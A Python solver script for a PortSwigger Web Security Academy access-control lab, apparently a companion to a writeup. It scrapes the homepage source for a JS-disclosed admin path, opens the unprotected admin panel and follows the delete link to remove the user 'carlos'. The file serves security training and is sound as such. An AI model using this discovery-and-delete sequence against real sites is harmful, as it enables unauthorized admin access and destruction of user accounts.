#!/usr/bin/env python3
"""
Unprotected admin functionality with unpredictable URL
PortSwigger Web Security Academy -- Access Control

Companion script for the writeup: 02-unprotected-admin-functionality-unpredictable-url.md

What this does:
    Fetches the homepage and regex-matches the raw HTML/JS for anything
    path-shaped containing "admin" -- the panel's URL is random, but it still
    has to be embedded somewhere the client can read it to link to it. Once
    found, it loads the panel, locates the delete link for carlos, and
    follows it.

Usage:
    python 02-unprotected-admin-functionality-unpredictable-url.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx
from urllib.parse import urljoin


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    home = client.get(lab_url)
    js_match = re.search(r"""['"](/[a-zA-Z0-9_-]*admin[a-zA-Z0-9_/-]*)['"]""", home.text, re.IGNORECASE)
    if not js_match:
        print("[-] No admin URL found in page source.")
        return

    admin_path = js_match.group(1)
    admin_url = f"{lab_url}{admin_path}"
    print(f"[+] Found admin URL in JS: {admin_path}")

    resp = client.get(admin_url)
    delete_match = re.search(r'href="([^"]*\?username=carlos[^"]*)"', resp.text, re.IGNORECASE)
    if not delete_match:
        delete_match = re.search(r'href="([^"]*delete[^"]*carlos[^"]*)"', resp.text, re.IGNORECASE)

    if delete_match:
        delete_path = delete_match.group(1)
        delete_url = f"{lab_url}{delete_path}" if delete_path.startswith("/") else urljoin(admin_url + "/", delete_path)
        print(f"[*] Deleting carlos via: {delete_url}")
        client.get(delete_url)
    else:
        print("[*] No delete link found, trying common delete pattern")
        client.get(f"{admin_url}/delete", params={"username": "carlos"})

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- carlos deleted via JS-disclosed admin panel.")
    else:
        print("[-] Not solved yet -- inspect the admin panel response for the real delete link.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
